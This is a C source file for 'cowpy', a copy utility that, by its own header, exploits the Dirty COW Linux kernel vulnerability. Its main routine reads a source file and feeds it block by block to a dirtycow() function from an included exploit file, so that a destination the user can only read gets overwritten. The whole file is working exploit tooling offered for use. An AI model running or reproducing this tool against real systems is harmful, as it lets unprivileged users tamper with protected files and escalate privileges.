/* cowpy - LGPL Copyright 2016 - pancake@nowsecure.com */
/*                                                    */
/* cp-like tool exploiting the dirtycow vulnerability */

#include "exploit.c"

#define R_MIN(x,y) (((x)>(y))?(y):(x))
int main(int argc, char **argv) {
	if (argc < 3) {
		printf ("Usage: cowpy [src] [dst]\n");
		return 1;
	}
	int f = open (argv[1], O_RDONLY);
	if (f == -1) {
		printf ("Cannot open source\n");
		return 1;
	}

	struct stat st;
	fstat (f, &st);
	int size = st.st_size;


	int d = open (argv[2], O_RDONLY);

	fstat (d, &st);

	if (st.st_size < size) {
		printf ("Warning: Destination file is too small. :(\n");
		printf ("Warning: Data will be truncated\n");
	}	
	unsigned char *buf = malloc (size);
	read (f, buf, size);
	close (f);
	const int bs = 1024;
	int i;
	for (i= 0; i< size; i+= bs) {
		int rc = dirtycow (argv[2], i, buf + i, R_MIN (bs,size-i));
		if (rc == -1) {
			printf ("Error\n");
			return 1;
		}
	}
	printf ("Done\n");
	free (buf);
	return 0;
}
